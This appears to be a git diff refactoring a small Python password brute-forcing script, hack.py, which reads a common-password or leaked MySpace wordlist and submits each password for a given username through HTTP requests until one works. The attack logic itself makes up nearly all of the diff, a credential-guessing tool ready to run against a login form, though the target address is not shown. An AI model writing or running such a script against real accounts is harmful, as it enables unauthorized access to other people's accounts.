@@ -1,17 +1,10 @@
+import os
 import sys
 
 import requests
 
 
-def main(username, use_myspace=False):
-    if use_myspace:
-        password_file = 'password_lists/myspace.txt'
-    else:
-        password_file = 'password_lists/common_passwords.txt'
-
-    with open(password_file) as password_list:
-        passwords = password_list.read().split('\n')
-
+def hack(username, passwords):
     for count, password in enumerate(passwords):
         data = {
             'username': username,
@@ -34,7 +27,24 @@ def main(username, use_myspace=False):
     print(f'Could not find password for {username}')
 
 
+def main(args):
+    username = args[1]
+
+    current_dir = os.getcwd()
+    if '--use_myspace' in args:
+        password_file = os.path.join(current_dir, 'password_lists/myspace.txt')
+    else:
+        password_file = os.path.join(current_dir, 'password_lists/common_passwords.txt')
+
+    with open(password_file) as password_list:
+        passwords = password_list.read().split('\n')
+
+    hack(username, passwords)
+
+
 if __name__ == '__main__':
-    username = sys.argv[1]
-    use_myspace = '--use_myspace' in sys.argv
-    main(username, use_myspace)
+    if len(sys.argv) == 1:
+        print('Usage: python hack.py username [--use_myspace]')
+        sys.exit(0)
+
+    main(sys.argv)
